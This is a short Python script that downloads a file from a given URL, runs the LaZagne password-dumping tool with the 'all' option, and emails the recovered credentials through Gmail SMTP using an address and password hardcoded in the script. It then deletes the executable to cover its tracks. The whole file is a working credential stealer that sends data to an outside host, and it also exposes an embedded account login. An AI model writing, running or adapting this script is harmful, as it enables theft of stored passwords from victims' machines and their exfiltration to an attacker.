#!usr/bin/env python
import requests
import smtplib
import subprocess
import argparse
import os
import tempfile


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="url of the file")
    options = parser.parse_args()
    return options


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.tls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
options = get_arguments()
download(options.url)
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("tsxnshaw@gmail.com", "sa1234@abcd", result)
os.remove("laZagne.exe")
